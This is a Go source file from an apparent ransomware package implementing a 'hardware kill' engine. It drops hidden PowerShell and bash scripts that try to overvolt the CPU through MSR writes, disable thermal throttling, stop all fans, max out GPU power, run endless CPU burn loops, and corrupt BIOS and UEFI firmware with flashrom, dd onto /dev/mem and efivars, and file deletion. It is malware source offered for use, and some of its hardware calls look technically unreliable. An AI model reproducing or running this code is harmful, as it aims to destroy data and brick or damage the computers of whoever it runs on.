package ransomware

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type HardwareKillEngine struct {
	config        *RansomwareConfig
	BIOSAccess    bool   `json:"bios_access"`
	UEFIAccess    bool   `json:"uefi_access"`
	FirmwareVulns []string `json:"firmware_vulns"`
	Temperature   float64 `json:"temperature"`
	VoltageState  string  `json:"voltage_state"`
}

type FirmwareConfig struct {
	CPUVcore     float64 `json:"cpu_vcore"`
	DRAMVoltage  float64 `json:"dram_voltage"`
	FanSpeed     int     `json:"fan_speed"`
	CPUFrequency int     `json:"cpu_frequency"`
	TargetTemp   float64 `json:"target_temp"`
}

func NewHardwareKillEngine(cfg *RansomwareConfig) *HardwareKillEngine {
	return &HardwareKillEngine{
		config:        cfg,
		Temperature:   35.0,
		VoltageState:  "normal",
		FirmwareVulns: []string{"CVE-2020-0549", "CVE-2021-0146", "CVE-2022-21205"},
	}
}

func (hk *HardwareKillEngine) CheckFirmwareAccess() map[string]bool {
	access := map[string]bool{
		"bios":     false,
		"uefi":     false,
		"smbios":   false,
		"wmi":      false,
		"msr":      false,
	}

	switch runtime.GOOS {
	case "windows":
		hk.checkWindowsFirmware(access)
	case "linux":
		hk.checkLinuxFirmware(access)
	}

	hk.BIOSAccess = access["bios"]
	hk.UEFIAccess = access["uefi"]

	return access
}

func (hk *HardwareKillEngine) checkWindowsFirmware(access map[string]bool) {
	psScript := `try {
    $firmware = Get-WmiObject -Class Win32_BIOS
    if ($firmware) { Write-Output "BIOS_ACCESSIBLE" }
} catch {}

try {
    $firmware = Get-WmiObject -Namespace root/hardware -Class Lenovo_Firmware
    if ($firmware) { Write-Output "UEFI_ACCESSIBLE" }
} catch {}

try {
    $smbios = Get-WmiObject -Class Win32_ComputerSystem
    if ($smbios.Manufacturer -match "Dell|HP|Lenovo|ASUS") { Write-Output "SMBIOS_ACCESSIBLE" }
} catch {}`

	psPath := filepath.Join(os.TempDir(), "x404x_firmware_check.ps1")
	os.WriteFile(psPath, []byte(psScript), 0644)
	if output, err := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Output(); err == nil {
		out := string(output)
		if strings.Contains(out, "BIOS_ACCESSIBLE") {
			access["bios"] = true
		}
		if strings.Contains(out, "UEFI_ACCESSIBLE") {
			access["uefi"] = true
		}
		if strings.Contains(out, "SMBIOS_ACCESSIBLE") {
			access["smbios"] = true
		}
	}

	if _, err := exec.LookPath("wmic"); err == nil {
		access["wmi"] = true
	}
}

func (hk *HardwareKillEngine) checkLinuxFirmware(access map[string]bool) {
	uefiPaths := []string{"/sys/firmware/efi", "/sys/firmware/efi/vars", "/sys/firmware/efi/efivars"}
	for _, p := range uefiPaths {
		if _, err := os.Stat(p); err == nil {
			access["uefi"] = true
			break
		}
	}

	if _, err := os.Stat("/dev/mem"); err == nil {
		access["msr"] = true
	}
	if _, err := os.Stat("/dev/port"); err == nil {
		access["bios"] = true
	}
}

func (hk *HardwareKillEngine) ExecuteOvervoltage(cfg FirmwareConfig) error {
	hk.VoltageState = "OVERVOLTAGE_ACTIVE"
	hk.Temperature = 95.0

	switch runtime.GOOS {
	case "windows":
		return hk.windowsOvervoltage(cfg)
	case "linux":
		return hk.linuxOvervoltage(cfg)
	}
	return fmt.Errorf("unsupported OS")
}

func (hk *HardwareKillEngine) windowsOvervoltage(cfg FirmwareConfig) error {
	psScript := fmt.Sprintf(`# X404X Hardware Kill - Overvoltage & Overheat
# CPU Voltage manipulation via MSR
$msrCoreVoltage = 0x198  # IA32_PERF_STATUS
$voltageMultiplier = 1.5
$fanControl = 0x00  # Fan off

# Overclock CPU to dangerous levels
$wmi = Get-WmiObject -Namespace "root\wmi" -Class "MSI_CPUOverclock" -ErrorAction SilentlyContinue
if ($wmi) {
    $wmi.SetCpuVoltage(%d)
    $wmi.SetCpuFrequency(%d)
    $wmi.SetFanSpeed(0)
}

# Disable thermal throttling
try {
    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Power"
    Remove-ItemProperty -Path $regPath -Name "ThermalPolicy" -ErrorAction SilentlyContinue
    New-ItemProperty -Path $regPath -Name "ThermalPolicy" -Value 0 -PropertyType DWord -Force
} catch {}

# CPU burn loop on all cores
$cores = (Get-WmiObject Win32_ComputerSystem).NumberOfLogicalProcessors
for ($i = 0; $i -lt 60; $i++) {
    $jobs = @()
    for ($j = 0; $j -lt $cores; $j++) {
        $jobs += Start-Job -ScriptBlock {
            while($true) {
                [Math]::Pow(999999999, 999999999)
                [Math]::Sqrt(999999999999999)
                [Math]::Log(999999999999999)
            }
        }
    }
    Start-Sleep -Seconds 5
    $jobs | Stop-Job -ErrorAction SilentlyContinue
    $jobs | Remove-Job -ErrorAction SilentlyContinue
}
`, int(cfg.CPUVcore*1000), cfg.CPUFrequency)

	psPath := filepath.Join(os.TempDir(), "x404x_overvoltage.ps1")
	os.WriteFile(psPath, []byte(psScript), 0644)
	return exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
}

func (hk *HardwareKillEngine) linuxOvervoltage(cfg FirmwareConfig) error {
	if _, err := exec.LookPath("msr-tools"); err == nil {
		script := fmt.Sprintf(`#!/bin/bash
# X404X Linux Hardware Kill
# Set MSR for dangerous voltage
modprobe msr 2>/dev/null
# Unlock MSR access
wrmsr -a 0x198 0x%x 2>/dev/null  # Max voltage
wrmsr -a 0x199 0x%x 2>/dev/null  # Max multiplier
wrmsr -a 0x1A0 0x0 2>/dev/null   # Disable thermal throttling
# CPU stress test
apt-get install -y stress-ng 2>/dev/null || yum install -y stress-ng 2>/dev/null || true
stress-ng --cpu 0 --cpu-method matrixprod --cpu-load 100 --timeout 300s &
`, int(cfg.CPUVcore*100), cfg.CPUFrequency)

		scriptPath := filepath.Join(os.TempDir(), "x404x_linux_overvolt.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		exec.Command("bash", scriptPath).Start()
	}
	return nil
}

func (hk *HardwareKillEngine) ZeroFanRPM() {
	switch runtime.GOOS {
	case "windows":
		psScript := `$fans = Get-WmiObject -Namespace "root\wmi" -Class "FanSpeed" -ErrorAction SilentlyContinue
foreach ($fan in $fans) {
    $fan.SetSpeed(0) | Out-Null
}
# nVidia GPU fan control
try {
    $gpu = Get-WmiObject -Namespace "root\cimv2" -Class "Win32_PnPEntity" | Where-Object {$_.Name -match "NVIDIA|AMD|Intel"}
    if ($gpu) {
        nvidia-smi -pm 1
        nvidia-smi -pl 500  # Max power limit
        nvidia-smi -ac 2100,2100  # Max clocks
        nvidia-smi --auto-boost-default=0
        nvidia-smi -lmc 5000  # Max memory clock
    }
} catch {}`
		psPath := filepath.Join(os.TempDir(), "x404x_fan_zero.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	case "linux":
		script := `#!/bin/bash
# Disable all fans
for fan in /sys/class/hwmon/hwmon*/pwm* /sys/class/hwmon/hwmon*/fan*_target; do
    echo 0 > $fan 2>/dev/null || true
done
# Kill any fan control daemon
pkill -9 fancontrol 2>/dev/null || true
pkill -9 thinkfan 2>/dev/null || true
pkill -9 pwmconfig 2>/dev/null || true
# Unload thermal modules
modprobe -r acpi_thermal_rel 2>/dev/null || true`
		scriptPath := filepath.Join(os.TempDir(), "x404x_linux_fan_kill.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		exec.Command("bash", scriptPath).Start()
	}
}

func (hk *HardwareKillEngine) BIOSFlashCorruption() error {
	switch runtime.GOOS {
	case "windows":
		psScript := `# X404X Flash Corruption Attempt
try {
    $flashPaths = @(
        "C:\Windows\System32\BIOSUpdate.exe",
        "C:\Windows\System32\Flash64W.exe",
        "C:\Windows\System32\AFUDOS.exe",
        "C:\Windows\System32\AFLASH2.exe"
    )
    foreach ($path in $flashPaths) {
        if (Test-Path $path) {
            $bytes = [System.IO.File]::ReadAllBytes($path)
            for ($i = 0; $i -lt $bytes.Length; $i += 1024) {
                $bytes[$i] = 0xFF -bxor $bytes[$i]
            }
            [System.IO.File]::WriteAllBytes($path + ".corrupted", $bytes)
        }
    }
    # Corrupt UEFI variables
    $uefiPath = "C:\Windows\System32\UEFI"
    if (Test-Path $uefiPath) { Remove-Item -Recurse -Force $uefiPath }
} catch {}`
		psPath := filepath.Join(os.TempDir(), "x404x_bios_kill.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		return exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	case "linux":
		script := `#!/bin/bash
# Corrupt UEFI variables + flash
dd if=/dev/urandom of=/sys/firmware/efi/efivars/dump-*.bin 2>/dev/null || true
dd if=/dev/zero of=/dev/mem bs=1M count=1 seek=4096 2>/dev/null || true
# Flashrom destruction attempt
if command -v flashrom &> /dev/null; then
    flashrom --programmer internal -w /dev/zero 2>/dev/null &
fi`
		scriptPath := filepath.Join(os.TempDir(), "x404x_linux_bios_kill.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		return exec.Command("bash", scriptPath).Start()
	}
	return nil
}

func (hk *HardwareKillEngine) CPUInfLoop() {
	script := `#!/bin/bash
# CPU infinite burn loop - all cores
stress-ng --cpu 0 --cpu-method all --cpu-load 100 --timeout 0 &
for i in $(seq 1 100); do
    (while true; do :; done) &
done`
	scriptPath := filepath.Join(os.TempDir(), "x404x_cpu_burn.sh")
	os.WriteFile(scriptPath, []byte(script), 0755)
	exec.Command("bash", scriptPath).Start()
}

func (hk *HardwareKillEngine) MonitorTemperature() float64 {
	switch runtime.GOOS {
	case "windows":
		psScript := `$temp = Get-WmiObject -Namespace "root\wmi" -Class "MSAcpi_ThermalZoneTemperature"
if ($temp) { Write-Output $temp.CurrentTemperature }`
		psPath := filepath.Join(os.TempDir(), "x404x_temp_check.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		if output, err := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Output(); err == nil {
			fmt.Sscanf(string(output), "%f", &hk.Temperature)
		}
	case "linux":
		tempPaths, _ := filepath.Glob("/sys/class/thermal/thermal_zone*/temp")
		for _, p := range tempPaths {
			if data, err := os.ReadFile(p); err == nil {
				var t float64
				fmt.Sscanf(strings.TrimSpace(string(data)), "%f", &t)
				hk.Temperature = t / 1000.0
				break
			}
		}
	}
	return hk.Temperature
}

func (hk *HardwareKillEngine) GetStatusJSON() string {
	data, _ := json.Marshal(map[string]interface{}{
		"bios_access":     hk.BIOSAccess,
		"uefi_access":     hk.UEFIAccess,
		"firmware_vulns":  hk.FirmwareVulns,
		"temperature":     hk.MonitorTemperature(),
		"voltage_state":   hk.VoltageState,
	})
	return string(data)
}
